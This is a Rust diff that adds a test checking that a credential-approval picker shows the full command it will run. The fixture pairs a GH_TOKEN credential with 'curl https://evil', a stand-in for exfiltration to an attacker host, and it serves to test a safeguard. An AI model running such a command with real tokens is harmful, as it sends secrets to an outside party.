@@ -2471,6 +2471,33 @@ fn write_dec(buf: &mut Vec<u8>, n: u16) {
 mod tests {
     use super::*;
 
+    #[test]
+    fn exec_picker_renders_the_command() {
+        // The picker must show the attacker-controlled command, not just the
+        // credential names — binding approval to a visible command is the
+        // security control. A render that dropped the command would let the
+        // operator approve blind.
+        let state = crate::exec::ExecPickerState {
+            command: "curl".to_string(),
+            args: vec!["https://evil".to_string()],
+            items: vec![crate::exec::ExecPickerItem {
+                name: "GH_TOKEN".to_string(),
+                display: "gh".to_string(),
+                kind: crate::exec::ExecItemKind::Literal,
+                source: "x".to_string(),
+                selected: false,
+            }],
+            cursor: 0,
+        };
+        let mut buf = Vec::new();
+        Dialog::ExecPicker(state).render(&mut buf, 40, 120);
+        let text = String::from_utf8_lossy(&buf);
+        assert!(
+            text.contains("Run: curl https://evil"),
+            "picker must render the command: {text}"
+        );
+    }
+
     fn picker(agents: Vec<&str>) -> Dialog {
         // Mirror the daemon's construction site: `Dialog::new_agent_picker`
         // computes the initial `selected` past the leading `"agents"`
